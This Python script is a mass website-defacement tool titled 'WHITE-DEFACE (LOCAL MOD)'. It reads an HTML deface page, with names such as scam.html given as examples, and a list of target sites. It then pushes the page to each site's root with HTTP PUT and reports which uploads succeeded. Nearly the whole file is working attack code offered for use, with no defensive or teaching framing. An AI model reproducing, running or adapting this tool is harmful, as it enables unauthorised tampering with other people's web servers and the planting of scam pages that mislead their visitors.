# -*- coding: utf-8 -*-

import os
import sys
import time
import random
import threading

try:
    import requests
except ImportError:
    exit("install requests and try again ... (pip install requests)")

# Colors
red    = "\033[31m"
blue   = "\033[34m"
bold   = "\033[1m"
reset  = "\033[0m"
green  = "\033[32m"
yellow = "\033[33m"

colors = [
    "\033[38;5;226m",
    "\033[38;5;227m",
    "\033[38;5;229m",
    "\033[38;5;230m",
    "\033[38;5;190m",
    "\033[38;5;191m",
    "\033[38;5;220m",
    "\033[38;5;221m",
    "\033[38;5;142m",
    "\033[38;5;214m",
]
color1, color2, color3, color4, color5 = random.sample(colors, 5)

BANNER = f"""{green}{bold}
========================================
   WHITE-DEFACE (LOCAL MOD)
========================================{reset}
"""

def animate():
    text = "Uploading your script to websites..."
    while True:
        for i in range(len(text)):
            print(text[:i] + "_" + text[i+1:], end="\r", flush=True)
            time.sleep(0.1)

def eagle(prompt):
    if sys.version_info.major > 2:
        return input(prompt)
    else:
        return raw_input(prompt)

def white(script, target_file="targets.txt"):
    # Read the HTML (deface) script with explicit encoding
    try:
        with open(script, "r", encoding="utf-8", errors="replace") as f:
            op = f.read()
    except OSError as e:
        print(red + bold + f"[!] Failed to read '{script}': {e}" + reset)
        return

    # Read the targets list
    try:
        with open(target_file, "r", encoding="utf-8", errors="replace") as target:
            targets = target.readlines()
    except OSError as e:
        print(red + bold + f"[!] Failed to read '{target_file}': {e}" + reset)
        return

    s = requests.Session()

    print(" ")
    print(
        green + bold +
        "[✓]\033[0m \033[34mUploading your script to %d website(s)...."
        % (len(targets)),
        end="",
        flush=True
    )
    print(" ")

    # start the animation thread
    t = threading.Thread(target=animate, daemon=True)
    t.start()

    for web in targets:
        try:
            site = web.strip()
            if not site:
                continue  # skip empty lines

            # Add scheme if missing
            if not site.startswith(("http://", "https://")):
                site = "http://" + site

            # Ensure single trailing slash
            if not site.endswith("/"):
                site = site + "/"

            # PUT the HTML as body
            req = s.put(site, data=op, timeout=10)

            if not (200 <= req.status_code < 300):
                print(
                    f"{red}[{bold} FAILED TO UPLOAD !\033[0m     {red} ] "
                    f"{site}{script} (status: {req.status_code})"
                )
            else:
                print(
                    f"{green}[{bold} SUCCESSFULLY UPLOADED ✓\033[0m{green} ] "
                    f"{site}{script} (status: {req.status_code})"
                )

        except requests.exceptions.RequestException as e:
            print(
                f"{red}[ERROR]{reset} {site} -> {e}"
            )
            continue
        except KeyboardInterrupt:
            print()
            exit()

def main():
    # Optional: pull & clear when running directly (comment out if not needed)
    # os.system("git pull")
    # os.system("cls")  # or 'clear' on Linux/macOS

    print(BANNER)
    while True:
        try:
            print(green + '[scammer.html]' + reset + blue)
            print(' ')
            a = eagle(
                green + "[+]\033[0m \033[34mEnter your deface script's name "
                "\033[33m[eg: scam.html]\033[0m \033[34m> "
            )

            if not os.path.isfile(a):
                print(' ')
                print(red + bold + "    file '%s' not found in this folder !" % (a,))
                print(" ")
                continue
            else:
                break

        except KeyboardInterrupt:
            print()
            exit()

    white(a)

if __name__ == "__main__":
    main()